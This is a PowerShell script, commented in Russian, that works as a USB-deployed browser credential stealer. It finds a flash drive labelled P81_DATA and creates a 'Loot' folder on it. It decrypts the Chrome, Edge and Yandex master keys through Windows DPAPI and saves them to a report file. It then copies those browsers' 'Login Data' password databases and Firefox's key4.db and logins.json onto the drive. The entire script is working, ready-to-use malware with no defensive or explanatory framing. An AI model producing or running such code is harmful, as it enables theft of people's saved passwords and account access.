# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Создание папки с временной меткой
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки (Chromium)
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS.txt"

# Список браузеров для обработки
$browsers = @(
    @{n="Chrome"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="Edge"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="Yandex"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $path = $b.p
    $ls = "$path\Local State"
    if (Test-Path $ls) {
        try {
            # Извлекаем мастер-ключ
            $json = Get-Content $ls -Raw | ConvertFrom-Json
            $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $unp = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
            
            # Пишем в отчет, чей это ключ
            "[$($b.n)] Master Key: $([Convert]::ToBase64String($unp))" >> $report
            
            # 4. Копирование баз с четкими подписями
            Get-ChildItem -Path $path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
                # Формируем имя: Браузер_Профиль.db (например, Chrome_Default.db)
                $profile = $_.Directory.Name
                $targetName = "$($b.n)_$($profile).db"
                Copy-Item $_.FullName -Destination "$dest\$targetName" -Force
            }
        } catch {}
    }
}

# 5. Сбор Firefox
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem $ff -Directory | ForEach-Object {
        $n = $_.Name # Имя профиля Firefox
        # Копируем с префиксом браузера и профиля
        Copy-Item "$($_.FullName)\key4.db" -Destination "$dest\FF_$($n)_key4.db" -Force -ErrorAction SilentlyContinue
        Copy-Item "$($_.FullName)\logins.json" -Destination "$dest\FF_$($n)_logins.json" -Force -ErrorAction SilentlyContinue
    }
}

exit
